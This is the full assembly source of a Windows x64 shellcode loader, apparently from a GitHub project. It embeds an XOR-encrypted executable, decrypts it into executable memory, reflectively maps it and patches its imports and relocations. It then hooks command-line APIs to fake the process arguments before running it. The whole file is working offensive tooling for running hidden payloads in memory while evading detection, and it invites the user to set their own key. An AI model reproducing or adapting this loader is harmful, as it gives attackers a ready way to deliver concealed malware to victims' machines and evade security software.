; SHELLCODE LOADER BY KOWFSUN
; https://github.com/ssovfsun/ShellcodeRunPE




format binary
use64

jmp start

key db 0x0B,0x99,0xDE,0x10,0xF2,0x5D,0xA5,0xA1,0x73,0x3E,0xA0,0x6D,0x51,0xC1,0x90,0xEE ; change this to whatever key you want
key_size = 16

macro xor_incbin filename {
    local b, kidx, size, byteval, kbyte, outpos
    local k0, k1, k2, k3, k4, k5, k6, k7, k8, k9, k10, k11, k12, k13, k14, k15
    load k0  byte from key + 0
    load k1  byte from key + 1
    load k2  byte from key + 2
    load k3  byte from key + 3
    load k4  byte from key + 4
    load k5  byte from key + 5
    load k6  byte from key + 6
    load k7  byte from key + 7
    load k8  byte from key + 8
    load k9  byte from key + 9
    load k10 byte from key + 10
    load k11 byte from key + 11
    load k12 byte from key + 12
    load k13 byte from key + 13
    load k14 byte from key + 14
    load k15 byte from key + 15
    outpos = $
    file filename
    size = $ - outpos
    b = 0
    kidx = 0
    repeat size
        load byteval byte from outpos + b
        if kidx = 0
            kbyte = k0
        else if kidx = 1
            kbyte = k1
        else if kidx = 2
            kbyte = k2
        else if kidx = 3
            kbyte = k3
        else if kidx = 4
            kbyte = k4
        else if kidx = 5
            kbyte = k5
        else if kidx = 6
            kbyte = k6
        else if kidx = 7
            kbyte = k7
        else if kidx = 8
            kbyte = k8
        else if kidx = 9
            kbyte = k9
        else if kidx = 10
            kbyte = k10
        else if kidx = 11
            kbyte = k11
        else if kidx = 12
            kbyte = k12
        else if kidx = 13
            kbyte = k13
        else if kidx = 14
            kbyte = k14
        else
            kbyte = k15
        end if
        store byteval xor kbyte at outpos + b
        b = b + 1
        kidx = kidx + 1
        if kidx = key_size
            kidx = 0
        end if
    end repeat
    payload_size = size
}

decrypt_loop:
    push rdi
    lea r9, [key]
.loop:
    mov al, [r9 + rdi]
    mov r10b, [rcx]
    xor r10b, al
    mov [rdx], r10b
    inc rcx
    inc rdx
    inc rdi
    cmp rdi, key_size
    jb .skip
    xor rdi, rdi       
.skip:
    dec r8
    jnz .loop
    pop rdi
    ret


start:
    push rbp
    mov rbp, rsp
    and rsp, -16
    sub rsp, 112


    call get_kernel32
    mov r15, rax                


    lea rdx, [szLoadLibraryA]
    mov rcx, r15
    call get_proc_addr
    mov [rsp + 32], rax


    lea rdx, [szGetProcAddress]
    mov rcx, r15
    call get_proc_addr
    mov [rsp + 40], rax


    lea rdx, [szVirtualAlloc]
    mov rcx, r15
    call get_proc_addr
    mov [rsp + 48], rax


    lea rdx, [szVirtualProtect]
    mov rcx, r15
    call get_proc_addr
    mov [rsp + 56], rax


    lea rdx, [szWideCharToMultiByte]
    mov rcx, r15
    call get_proc_addr
    mov [rsp + 72], rax


    lea rcx, [szShell32]
    call qword [rsp + 32]
    
    mov rcx, rax
    lea rdx, [szCommandLineToArgvW]
    call qword [rsp + 40]
    mov [rsp + 64], rax





    mov rcx, 0
    mov rdx, 128
    mov r8, 0x1000
    mov r9, 0x04
    call qword [rsp + 48]
    mov rbx, rax










    mov rax, [rsp + 32]
    mov [rbx + 0], rax
    mov rax, [rsp + 40]
    mov [rbx + 8], rax
    mov rax, [rsp + 48]
    mov [rbx + 16], rax
    mov rax, [rsp + 56]
    mov [rbx + 24], rax
    mov rax, [rsp + 64]
    mov [rbx + 32], rax
    mov rax, [rsp + 72]
    mov [rbx + 40], rax


    lea rax, [g_ctx]
    mov [rax], rbx

    mov rcx, 0
    mov rdx, payload_size
    mov r8, 0x3000
    mov r9, 0x40
    call qword [rbx + 16]
    test rax, rax
    jz .done
    mov r11, rax

    lea rcx, [payload]     
    mov rdx, r11         
    mov r8, payload_size 
    xor rdi, rdi
    call decrypt_loop


    mov rcx, r11
    mov rdx, rbx
    lea r8, [szCmdLine]
    call pe_loader

.done:


    mov rsp, rbp
    pop rbp
    ret




pe_loader:

    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 32

    mov r12, rcx
    mov r13, rdx
    mov r14, r8


    mov eax, [r12 + 0x3C]
    add rax, r12
    mov r15, rax


    mov ecx, [r15 + 0x50] 
    
    mov rdx, rcx
    mov rcx, 0
    mov r8, 0x3000
    mov r9, 0x40
    call qword [r13 + 16]
    mov rbx, rax


    mov ecx, [r15 + 0x54]
    mov rdi, rbx
    mov rsi, r12
    rep movsb


    movzx rcx, word [r15 + 6]
    movzx rax, word [r15 + 20]
    lea rsi, [r15 + 24]
    add rsi, rax

.copy_sections:
    test rcx, rcx
    jz .sections_done
    
    mov r8d, [rsi + 16]
    test r8d, r8d
    jz .next_section

    mov r9d, [rsi + 12]
    mov eax, [rsi + 20]
    
    push rcx
    push rsi
    push rdi
    
    lea rdi, [rbx + r9]
    lea rsi, [r12 + rax]
    mov rcx, r8
    rep movsb
    
    pop rdi
    pop rsi
    pop rcx

.next_section:
    add rsi, 40
    dec rcx
    jmp .copy_sections

.sections_done:


    mov rcx, r14
    mov rdx, r13
    call masquerade_cmdline


    mov rcx, rbx
    mov rdx, r13
    call fix_iat


    mov rdx, [r15 + 0x30]
    mov rcx, rbx
    mov r8, rbx
    mov r9d, [r15 + 0x50]
    call apply_reloc


    mov eax, [r15 + 0x28]
    add rax, rbx 
    
    call rax

    add rsp, 32
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret




fix_iat:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    sub rsp, 40

    mov rbx, rcx
    mov r12, rdx


    mov eax, [rbx + 0x3C]
    add rax, rbx
    mov r8d, [rax + 0x90] 
    test r8d, r8d
    jz .iat_done

    lea rsi, [rbx + r8]

.iat_loop:
    mov eax, [rsi + 12]
    test eax, eax
    jz .iat_done

    lea rcx, [rbx + rax]
    call qword [r12 + 0]
    test rax, rax
    jz .next_desc
    mov r13, rax


    mov r8d, [rsi + 16]
    lea rdi, [rbx + r8] 


    mov r9d, [rsi + 0]
    test r9d, r9d
    jnz .has_orig
    mov r9d, [rsi + 16]
.has_orig:
    lea r14, [rbx + r9] 

.thunk_loop:
    mov rax, [r14] 
    test rax, rax
    jz .next_desc

    bt rax, 63
    jc .is_ordinal


    lea rdx, [rbx + rax + 2]
    mov rcx, r13
    

    cmp byte [r12 + 48], 1
    jne .resolve_normal

    push rdx
    push rcx
    
    mov rcx, rdx
    lea rdx, [sGetCommandLineA]
    call strcmpi
    test eax, eax
    jz .hook_cmdA

    mov rcx, [rsp + 8]
    lea rdx, [sGetCommandLineW]
    call strcmpi
    test eax, eax
    jz .hook_cmdW

    mov rcx, [rsp + 8]
    lea rdx, [s_wgetmainargs]
    call strcmpi
    test eax, eax
    jz .hook_wargs

    mov rcx, [rsp + 8]
    lea rdx, [s_getmainargs]
    call strcmpi
    test eax, eax
    jz .hook_args

    pop rcx
    pop rdx
    
.resolve_normal:
    call qword [r12 + 8]
    jmp .write_thunk

.hook_cmdA:
    pop rcx
    pop rdx
    lea rax, [hook_GetCommandLineA]
    jmp .write_thunk
.hook_cmdW:
    pop rcx
    pop rdx
    lea rax, [hook_GetCommandLineW]
    jmp .write_thunk
.hook_wargs:
    pop rcx
    pop rdx
    lea rax, [hook_wgetmainargs]
    jmp .write_thunk
.hook_args:
    pop rcx
    pop rdx
    lea rax, [hook_getmainargs]
    jmp .write_thunk

.is_ordinal:
    and rax, 0xFFFF
    mov rdx, rax
    mov rcx, r13
    call qword [r12 + 8]

.write_thunk:
    mov [rdi], rax
    add rdi, 8
    add r14, 8
    jmp .thunk_loop

.next_desc:
    add rsi, 20 
    jmp .iat_loop

.iat_done:
    add rsp, 40
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret




apply_reloc:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    
    mov r10, rcx
    sub r10, rdx

    mov rbx, r8


    mov eax, [rbx + 0x3C]
    add rax, rbx
    mov r11d, [rax + 0xB0] 
    test r11d, r11d
    jz .reloc_done

    lea rsi, [rbx + r11] 

.reloc_loop:
    mov eax, [rsi]
    test eax, eax
    jz .reloc_done
    
    mov ecx, [rsi + 4]
    lea rdi, [rsi + 8]
    
    mov rdx, rcx
    sub rdx, 8
    shr rdx, 1
    
.entry_loop:
    test rdx, rdx
    jz .next_block
    
    movzx r12d, word [rdi]
    mov r13d, r12d
    shr r13d, 12
    and r12d, 0xFFF
    
    cmp r13d, 10
    jne .skip_entry
    
    add r12d, eax
    add r12, rbx
    add [r12], r10

.skip_entry:
    add rdi, 2
    dec rdx
    jmp .entry_loop

.next_block:
    add rsi, rcx
    jmp .reloc_loop

.reloc_done:
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret




masquerade_cmdline:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 64

    mov rbx, rdx
    mov rsi, rcx


    mov rcx, rsi
    call strlenW
    mov r12, rax 
    
    lea rdx, [r12 * 2 + 2]
    mov rcx, 0
    mov r8, 0x1000
    mov r9, 0x04
    call qword [rbx + 16]
    mov [rbx + 64], rax   
    
    mov rdi, rax
    mov rcx, rsi
    call strcpyW


    mov rcx, 0 
    mov rdx, 0
    mov r8, rsi
    mov r9, -1
    mov qword [rsp + 32], 0
    mov qword [rsp + 40], 0
    mov qword [rsp + 48], 0
    mov qword [rsp + 56], 0 
    call qword [rbx + 40] 
    mov r13, rax 

    mov rdx, r13
    mov rcx, 0
    mov r8, 0x1000
    mov r9, 0x04
    call qword [rbx + 16] 
    mov [rbx + 56], rax  

    mov rcx, 0
    mov rdx, 0
    mov r8, rsi
    mov r9, -1
    mov [rsp + 32], rax 
    mov [rsp + 40], r13 
    mov qword [rsp + 48], 0
    mov qword [rsp + 56], 0
    call qword [rbx + 40] 


    lea rdx, [rbx + 88] 
    mov rcx, rsi
    call qword [rbx + 32]
    mov r14, rax 


    mov ecx, [rbx + 88] 
    shl rcx, 3 
    mov rdx, rcx
    mov rcx, 0
    mov r8, 0x1000
    mov r9, 0x04
    call qword [rbx + 16] 
    mov [rbx + 80], rax

    mov ecx, [rbx + 88]
    shl rcx, 3
    mov rdx, rcx
    mov rcx, 0
    mov r8, 0x1000
    mov r9, 0x04
    call qword [rbx + 16] 
    mov [rbx + 72], rax  


    xor r15, r15 
.arg_loop:
    cmp r15d, [rbx + 88]
    jge .arg_done

    mov rcx, [r14 + r15 * 8] 
    
    sub rsp, 48
    mov [rsp + 32], rcx
    call strlenW
    mov r12, rax
    mov rcx, [rsp + 32]
    add rsp, 48
    
    sub rsp, 48
    mov [rsp + 32], rcx
    lea rdx, [r12 * 2 + 2]
    mov rcx, 0
    mov r8, 0x1000
    mov r9, 0x04
    call qword [rbx + 16] 
    mov rdi, rax
    mov rcx, [rsp + 32]
    add rsp, 48
    
    mov rdx, [rbx + 80]
    mov [rdx + r15 * 8], rdi
    
    call strcpyW

    mov rsi, [rbx + 80]
    mov rsi, [rsi + r15 * 8] 

    mov rcx, 0
    mov rdx, 0
    mov r8, rsi
    mov r9, -1
    mov qword [rsp + 32], 0
    mov qword [rsp + 40], 0
    mov qword [rsp + 48], 0
    mov qword [rsp + 56], 0
    call qword [rbx + 40] 
    mov r13, rax

    mov rdx, r13
    mov rcx, 0
    mov r8, 0x1000
    mov r9, 0x04
    call qword [rbx + 16] 
    
    mov rdx, [rbx + 72]
    mov [rdx + r15 * 8], rax 
    
    mov rcx, 0
    mov rdx, 0
    mov r8, rsi
    mov r9, -1
    mov [rsp + 32], rax
    mov [rsp + 40], r13
    mov qword [rsp + 48], 0
    mov qword [rsp + 56], 0
    call qword [rbx + 40] 

    inc r15
    jmp .arg_loop

.arg_done:
    mov byte [rbx + 48], 1 
    
    add rsp, 64
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret


hook_GetCommandLineA:
    lea rax, [g_ctx]
    mov rax, [rax]
    mov rax, [rax + 56] 
    ret

hook_GetCommandLineW:
    lea rax, [g_ctx]
    mov rax, [rax]
    mov rax, [rax + 64] 
    ret

hook_wgetmainargs:
    lea rax, [g_ctx]
    mov rax, [rax]
    
    mov r8d, [rax + 88] 
    mov [rcx], r8d
    
    mov r8, [rax + 80] 
    mov [rdx], r8
    
    xor rax, rax
    ret

hook_getmainargs:
    lea rax, [g_ctx]
    mov rax, [rax]
    
    mov r8d, [rax + 88] 
    mov [rcx], r8d
    
    mov r8, [rax + 72] 
    mov [rdx], r8
    
    xor rax, rax
    ret


get_kernel32:
    mov rax, [gs:0x60]  
    mov rax, [rax + 0x18] 
    mov rax, [rax + 0x20] 
    mov rax, [rax]     
    mov rax, [rax]  
    mov rax, [rax + 0x20]   
    ret

get_proc_addr:
    push rbx
    push rsi
    push rdi
    push r12
    
    mov rbx, rcx
    mov r12, rdx
    
    mov eax, [rbx + 0x3C]
    add rax, rbx
    mov eax, [rax + 0x88] 
    test eax, eax
    jz .not_found
    add rax, rbx
    
    mov ecx, [rax + 0x18] 
    mov r8d, [rax + 0x20]
    add r8, rbx
    mov r9d, [rax + 0x24] 
    add r9, rbx
    mov r10d, [rax + 0x1C] 
    add r10, rbx
    
    xor rsi, rsi
.loop_names:
    cmp rsi, rcx
    je .not_found
    
    mov edi, [r8 + rsi * 4]
    add rdi, rbx
    
    push rcx
    push rsi
    push rdi
    
    mov rcx, rdi
    mov rdx, r12
    call strcmp
    test eax, eax
    
    pop rdi
    pop rsi
    pop rcx
    
    jz .found
    
    inc rsi
    jmp .loop_names
    
.found:
    movzx eax, word [r9 + rsi * 2] 
    mov eax, [r10 + rax * 4] 
    add rax, rbx
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

.not_found:
    xor rax, rax
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

strcmp:
    push rbx
    xor rax, rax
.loop:
    mov al, [rcx]
    mov bl, [rdx]
    cmp al, bl
    jne .diff
    test al, al
    jz .equal
    inc rcx
    inc rdx
    jmp .loop
.diff:
    movzx eax, al
    movzx ebx, bl
    sub eax, ebx
    pop rbx
    ret
.equal:
    xor eax, eax
    pop rbx
    ret

strcmpi:
    push rbx
.loop:
    mov al, [rcx]
    mov bl, [rdx]
    
    cmp al, 'A'
    jl .skip1
    cmp al, 'Z'
    jg .skip1
    add al, 32
.skip1:
    cmp bl, 'A'
    jl .skip2
    cmp bl, 'Z'
    jg .skip2
    add bl, 32
.skip2:
    cmp al, bl
    jne .diff
    test al, al
    jz .equal
    inc rcx
    inc rdx
    jmp .loop
.diff:
    movzx eax, al
    movzx ebx, bl
    sub eax, ebx
    pop rbx
    ret
.equal:
    xor eax, eax
    pop rbx
    ret

strlenW:
    xor rax, rax
.loop:
    cmp word [rcx + rax * 2], 0
    jz .done
    inc rax
    jmp .loop
.done:
    ret

strcpyW:
    xor rax, rax
.loop:
    mov dx, [rcx + rax * 2]
    mov [rdi + rax * 2], dx
    test dx, dx
    jz .done
    inc rax
    jmp .loop
.done:
    ret
    

szLoadLibraryA db 'LoadLibraryA', 0
szGetProcAddress db 'GetProcAddress', 0
szVirtualAlloc db 'VirtualAlloc', 0
szVirtualProtect db 'VirtualProtect', 0
szWideCharToMultiByte db 'WideCharToMultiByte', 0
szShell32 db 'Shell32.dll', 0
szCommandLineToArgvW db 'CommandLineToArgvW', 0

sGetCommandLineA db 'GetCommandLineA', 0
sGetCommandLineW db 'GetCommandLineW', 0
s_wgetmainargs db '__wgetmainargs', 0
s_getmainargs db '__getmainargs', 0

szCmdLine dw 'c','m','d','.','e','x','e', 0

g_ctx dq 0

payload:
    xor_incbin 'C:\example\path\file.exe'
